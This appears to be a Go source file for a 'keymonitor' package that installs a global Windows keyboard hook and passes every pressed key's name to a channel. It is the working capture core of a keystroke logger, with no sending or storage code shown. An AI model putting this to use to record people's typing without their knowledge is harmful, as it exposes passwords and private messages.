package keymonitor

import (
	"strings"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
)

func KeyMon(channel chan string) error {
	keyboardChan := make(chan types.KeyboardEvent)
	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}
	defer keyboard.Uninstall()
	
	for {
		k := <-keyboardChan
		if k.Message.String() == "WM_KEYDOWN" {
			key := strings.TrimPrefix(k.VKCode.String(), "VK_")
			channel <- key
		}
	}
}
